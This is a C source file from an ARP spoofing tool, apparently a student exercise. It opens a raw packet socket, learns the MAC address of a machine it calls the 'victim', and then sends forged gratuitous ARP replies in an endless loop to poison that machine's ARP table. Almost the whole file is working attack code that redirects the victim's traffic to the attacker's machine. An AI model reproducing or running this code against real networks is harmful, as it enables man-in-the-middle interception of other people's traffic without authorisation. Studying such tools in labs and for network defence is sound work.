
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <linux/if_ether.h>
#include <net/if.h>
#include "arpspoof.h"

int bind_socket_to_iface(int sock, t_addrs *addrs)
{
    // does not work if sll_ifindex is not set...
    struct sockaddr_ll device;
    socklen_t len = sizeof(device);
    memset(&device, 0, len);
    device.sll_family = AF_PACKET;
    device.sll_ifindex = addrs->ifa_index;
    device.sll_protocol = htons(ETH_P_ARP);

    return bind(sock, (struct sockaddr *)&device, sizeof(device));
}

int init_socket()
{
    return socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP));
}

// returns -1 in case of error
// returns 0 if nothing to read
// returns 1 if socket is readable
int socket_is_readable(int sock, unsigned int timeout_ms)
{
    struct timeval tv = {
        0,
        timeout_ms * 1000,
    };
    fd_set readfds;

    FD_ZERO(&readfds);
    FD_SET(sock, &readfds);

    return select(sock + 1, &readfds, NULL, NULL, &tv);
}

int send_arp_gratuitous_reply(int sock, const t_addr *src, const t_addr *target)
{
    int retval;
    char buff[sizeof(t_lvl2_ethernet_header) + sizeof(t_arp_packet) + sizeof(t_frame_check_sequence)];
    t_datagram datagram = {
        buff,
        sizeof(buff),
    };

    // duplicated code from datagram_serialize(), but I don't have time to refacto ;)
    // align memory of datagram with ethernet header and arp request
    t_lvl2_ethernet_header *ethernet_header = datagram.data;
    t_arp_packet *req = datagram.data + sizeof(t_lvl2_ethernet_header);
    t_frame_check_sequence *checksum = datagram.data + sizeof(t_lvl2_ethernet_header) + sizeof(t_arp_packet);

    // duplcated code from datagram_serialize() as well
    arp_serialize(req, ARP_OP_REPLY, src, target);
    ethernet_II_serialize(ethernet_header, src, target);
    checksum->crc = htonl(ethernet_II_crc32_compute(datagram.data, datagram.len - sizeof(t_frame_check_sequence)));

    print_datagram_info(&datagram);

    retval = write(sock, datagram.data, datagram.len);
    if (retval < 0)
    {
        printf("Failed to send arp packet: %s\n", strerror(errno));
        return -1;
    }

    return 0;
}

int send_arp_request(int sock, t_addrs *addrs)
{
    int retval;
    char buff[sizeof(t_lvl2_ethernet_header) + sizeof(t_arp_packet) + sizeof(t_frame_check_sequence)];
    t_datagram datagram = {
        buff,
        sizeof(buff),
    };

    retval = datagram_serialize(&datagram, addrs);
    if (retval != 0)
        return -1;

    retval = write(sock, datagram.data, datagram.len);
    if (retval < 0)
    {
        printf("Failed to send arp packet: %s\n", strerror(errno));
        return -1;
    }

    return 0;
}

int recv_arp_reply(int sock, t_addrs *addrs)
{
    int retval = socket_is_readable(sock, 1000); // wait 1s for arp reply
    if (retval == -1)
    {
        printf("Failed to listen arp reply: %s\n", strerror(errno));
        return -1;
    }
    else if (retval == 0)
    {
        printf("Failed to listen arp reply: timeout\n");
        return 1;
    }

    char buff[sizeof(t_lvl2_ethernet_header) + sizeof(t_arp_packet) + sizeof(t_frame_check_sequence)];
    t_datagram datagram = {
        buff,
        sizeof(buff),
    };
    if (read(sock, datagram.data, datagram.len) < 0)
    {
        printf("Failed to read arp reply: %s\n", strerror(errno));
        return -1;
    }

    if (datagram_unserialize(&datagram, addrs) != 0)
        return -1;

    return 0;
}

int get_mac_by_ip(int sock, t_addrs *addrs)
{
    int retval = 0;

    retval = retval || send_arp_request(sock, addrs);
    retval = retval || recv_arp_reply(sock, addrs);
    if (retval != 0)
        return -1;

    return 0;
}

int spoof_remote_arp_table(t_addrs *addrs)
{
    int sock = init_socket();
    if (sock == -1)
    {
        printf("Failed to create socket: %s.\n", strerror(errno));
        return -1;
    }

    if (bind_socket_to_iface(sock, addrs) == -1)
    {
        printf("Failed to bind socket to interface: %s.\n", strerror(errno));
        return -1;
    }

    // fetch remote mac address first
    if (get_mac_by_ip(sock, addrs) != 0)
        return -1;

    printf("Hardware address of victim ");
    print_iface_ip_addr(&addrs->dest);
    printf(" is ");
    print_iface_hardware_addr(&addrs->dest);
    printf("\n\n\n");

    // start spoofing here 😂
    t_addr spoofed = addrs->src;
    spoofed.ip = addrs->spoofed_ip; // arp table of attacked machine will be updated with 42.42.42.42 redirecting to my machine (based on mac address)

    while (1)
    {
        send_arp_gratuitous_reply(sock, &spoofed, &addrs->dest);

        printf("Told to ");
        print_iface_hardware_addr(&addrs->dest);
        printf(" I am ");
        print_iface_ip_addr(&spoofed);
        printf("\n");

        sleep(1);
    }

    close(sock);
    return 0;
}